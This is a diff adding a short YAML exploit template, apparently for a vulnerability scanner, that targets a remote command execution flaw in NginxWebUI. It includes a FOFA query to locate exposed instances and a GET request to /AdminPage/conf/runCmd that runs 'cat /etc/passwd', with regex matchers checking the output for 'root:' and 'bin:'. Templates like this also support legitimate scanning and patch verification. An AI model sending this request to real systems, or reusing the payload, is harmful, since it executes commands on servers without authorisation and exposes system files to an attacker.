@@ -1,0 +1,26 @@
+id: NginxWebUI run Cmd远程命令执行
+info:
+  name: NginxWebUI run Cmd远程命令执行
+  severity: critical
+  type: 远程命令执行
+  search-engine:
+    - fofa: app="nginxWebUI"
+  link:
+    - https://blog.csdn.net/holyxp/article/details/131433791
+http:
+  logic: ""
+  Packets:
+    - method: GET
+      path: /AdminPage/conf/runCmd?cmd=cat+/etc/passwd%26%26echo%20nginx
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+      body: ""
+      matchers:
+        regex-logic: and
+        regex:
+          - "root:"
+          - "bin:"
